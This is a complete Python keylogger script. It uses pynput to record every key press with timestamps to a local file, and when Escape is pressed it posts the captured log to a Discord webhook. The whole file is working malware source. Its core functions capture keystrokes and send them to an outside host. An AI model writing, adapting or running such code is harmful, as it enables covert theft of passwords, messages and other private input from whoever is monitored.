import datetime
import os
import requests
from pynput import keyboard

# key logging variables including file path to log file
log_file = "key_presses.txt"
keys_pressed = "" 

def send_log_to_discord():
    webhook = os.environ["WEBHOOK_URL"]

    with open(log_file, "r") as f:
        content = f.read()

    if len(content) > 1900:
        content = content[-1900:]

    data = {"content": f"Log update:\n{content}"}
    response = requests.post(webhook, json=data)
    
    if response.status_code == 204:
        print("Log sent to Discord successfully!")
    else:
        print(f"Failed to send log. Status code: {response.status_code}")

# Records key presses
def on_press(key):
    global keys_pressed
    try:
        keys_pressed += key.char  # regular key
        print(f"Key {key.char} pressed")
    except AttributeError:
        keys_pressed += f"[{key}]"  # special key
        print(f"Special key {key} pressed")

# Records released keys
def on_release(key):
    global keys_pressed
    
    # Only write if something was typed
    if keys_pressed:
        with open(log_file, "a") as f:
            f.write(f"{keys_pressed} at {datetime.datetime.now()}\n")
        keys_pressed = ""  # reset after writing
    
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        send_log_to_discord()
        return False

# Keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()